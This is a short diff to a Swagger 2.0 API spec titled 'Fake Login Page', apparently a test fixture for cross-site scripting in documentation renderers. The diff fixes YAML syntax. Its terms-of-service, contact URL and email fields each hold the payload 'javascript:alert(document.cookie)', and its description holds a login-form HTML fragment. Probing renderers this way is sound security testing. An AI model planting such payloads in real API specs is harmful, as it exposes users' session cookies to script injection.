@@ -2,10 +2,12 @@ swagger: '2.0'
 info:
   version: 1.0.0
   title: Fake Login Page
-  description: '<div class="login-form">
+  description: '<div class="login-form">'
   termsOfService: "javascript:alert(document.cookie)"
   contact: 
-    name: "API Support",
-    url: "javascript:alert(document.cookie)",
+    name: "API Support"
+    url: "javascript:alert(document.cookie)"
     email: "javascript:alert(document.cookie)"
+
+
   
